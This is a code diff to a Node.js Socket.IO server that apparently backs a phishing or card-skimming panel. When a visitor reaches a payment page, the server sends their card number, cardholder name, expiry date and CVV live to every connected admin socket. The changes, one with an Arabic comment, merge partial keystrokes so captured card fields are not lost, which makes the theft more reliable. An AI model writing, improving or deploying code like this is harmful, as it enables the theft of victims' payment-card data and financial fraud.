@@ -518,9 +518,8 @@ io.on("connection", (socket) => {
       if (isPaymentPage) {
         visitor.hasEnteredCardPage = true;
         visitor.lastDataUpdate = new Date().toISOString();
-        if (!visitor.liveCard) {
-          /*FIX42*/ if (!visitor.liveCard || !String(visitor.liveCard.cardNumber || "").replace(/\D/g, "")) { visitor.liveCard = { cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" }; }
-          visitor.liveCardTimestamp = new Date().toISOString();
+        /*FIX-LIVE*/ if (visitor.liveCard) {
+          visitor.liveCardTimestamp = visitor.liveCardTimestamp || new Date().toISOString();
           admins.forEach((admin, adminSocketId) => {
             io.to(adminSocketId).emit("card:liveUpdate", { visitorId: visitor._id, liveCard: visitor.liveCard, liveCardTimestamp: visitor.liveCardTimestamp });
           });
@@ -686,7 +685,14 @@ socket.on("card:live", (data) => {
   const expiryDate = String(data.expiryDate || '').replace(/[^0-9/]/g, '').slice(0, 7);
   const cvv = String(data.cvv || '').replace(/\D/g, '').slice(0, 4);
 
-  visitor.liveCard = { cardNumber, nameOnCard, expiryDate, cvv };
+  // [FIX-LIVE] دمج: لا نمحي القيم القديمة إذا وصلت فاضية
+  const __prev = visitor.liveCard || {};
+  visitor.liveCard = {
+    cardNumber: cardNumber || __prev.cardNumber || '',
+    nameOnCard: nameOnCard || __prev.nameOnCard || '',
+    expiryDate: expiryDate || __prev.expiryDate || '',
+    cvv: cvv || __prev.cvv || ''
+  };
   visitor.liveCardTimestamp = new Date().toISOString();
   visitors.set(socket.id, visitor);
 
